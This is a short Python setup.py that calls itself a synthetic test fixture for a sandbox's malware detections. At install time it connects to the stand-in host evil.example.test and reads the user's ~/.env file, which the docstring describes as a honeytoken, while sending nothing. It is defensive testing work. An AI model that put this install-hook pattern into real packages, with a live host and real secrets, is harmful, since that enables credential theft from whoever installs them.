"""SYNTHETIC TEST FIXTURE. Simulates install-time malicious behavior.

It never sends real data anywhere: the host evil.example.test is a reserved
name that does not resolve, and the .env it reads is a honeytoken in the
sandbox image. Its only purpose is to exercise the sandbox's detections.
"""
import os
import socket

from setuptools import setup

# Simulated exfiltration attempt to a non-allowlisted host.
try:
    socket.create_connection(("evil.example.test", 443), timeout=3)
except OSError:
    pass

# Simulated credential harvesting.
try:
    with open(os.path.expanduser("~/.env")) as fh:
        fh.read()
except OSError:
    pass

setup(name="malpkg", version="0.1.0", packages=["malpkg"])
